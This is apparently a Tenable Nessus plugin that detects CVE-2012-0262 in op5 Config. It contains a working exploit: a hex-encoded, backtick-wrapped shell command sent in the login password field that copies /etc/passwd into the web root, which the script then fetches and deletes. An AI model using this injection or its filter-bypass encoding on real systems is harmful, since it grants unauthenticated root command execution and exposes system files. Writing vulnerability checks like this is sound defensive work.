#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(57578);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2017/02/08 22:04:49 $");

  script_cve_id("CVE-2012-0262");
  script_bugtraq_id(51212);
  script_osvdb_id(78065);

  script_name(english:"op5 Config Arbitrary Command Execution");
  script_summary(english:"Attempts to execute a command.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP application that is vulnerable to
arbitrary command execution.");
  script_set_attribute(attribute:"description", value:
"The version of op5 Config hosted on the remote web server is earlier
than 2.0.3.  As such, it contains a flaw on its welcome page that
allows a remote, unauthenticated attacker to run arbitrary commands
with root privileges simply by enclosing them in backticks in the
password field.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?24b0cd28");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fcd924ab");
  script_set_attribute(attribute:"solution", value:"Upgrade op5 Config to version 2.0.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"OP5 Monitor 5.5 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
script_set_attribute(attribute:"metasploit_name", value:'OP5 welcome Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/12/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/12/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/01/17");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:op5:system-op5config");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("op5_portal_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/op5_portal");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("url_func.inc");
include("webapp_func.inc");

global_var dir, file, port;

function encode()
{
  local_var cmd, i, res;

  cmd = _FCT_ANON_ARGS[0];

  res = 'eval $(echo -ne "';

  for (i = 0; i < strlen(cmd); i++)
  {
    res += "\x" + hexstr(cmd[i]);
  }

  res += '")';

  return res;
}

function run_cmd()
{
  local_var cmd, hdrs;

  cmd = _FCT_ANON_ARGS[0];

  # Convert command to hex encoding for echo. This is necessary due to
  # several characters (notably '|', '>', and ';') being filtered.
  cmd = encode(cmd);

  # Add backticks to cause our command to be executed by PHP.
  cmd = "`" + cmd + "`";

  # Convert command to percent encoding for HTTP.
  cmd = urlencode(str:cmd);

  # Send the command to the server an an HTTP POST request.
  hdrs = make_array(
    "Content-Type", "application/x-www-form-urlencoded"
  );

  http_send_recv3(
    port         : port,
    method       : "POST",
    item         : dir + "/op5config/welcome",
    data         : "do=do%3dLogin&password=" + cmd,
    add_headers  : hdrs,
    exit_on_fail : TRUE
  );
}

# Get details of the op5 Portal install.
port = get_http_port(default:443);

install = get_install_from_kb(appname:"op5_portal", port:port, exit_on_fail:TRUE);
dir = install["dir"];

# Generate a unique filename.
file = (SCRIPT_NAME - ".nasl") + "-" + rand() + ".html";

# Attempt to run a command on the remote host. This runs, by default,
# as root:apache with / as the working directory.
run_cmd("/usr/bin/find / -type d -name op5config -exec cp /etc/passwd {}/" + file + " \;");
req = http_last_sent_request();

# Check if the file that the previous command was trying to generate
# exists.
url = dir + "/op5config/" + file;
res = http_send_recv3(
  port   : port,
  method : "GET",
  item   : url
);

# Attempt to clean up the file(s) created by the previous command.
run_cmd("find / -type f -name " + file + " -delete");

if (isnull(res))
  exit(1, "HTTP request for " + build_url(port:port, qs:url) + " failed.");

# Check if the command we ran gave us the expected output.
if (!egrep(string:res[2], pattern:"root:.*:0:[01]:.*:"))
  exit(0, "The web server on port " + port + " is not affected.");

# Report our findings.
report = NULL;
if (report_verbosity > 0)
{
  bar = crap(data:"-", length:30);
  bar = bar + " snip " + bar;

  report =
    '\nNessus was able to verify the issue using the following request :' +
    '\n' +
    '\n' + req +
    '\n' +
    '\nWhich returned the following file contents :'+
    '\n' +
    '\n' + bar +
    '\n' + res[2] +
    '\n' + bar +
    '\n';
}
security_hole(port:port, extra:report);
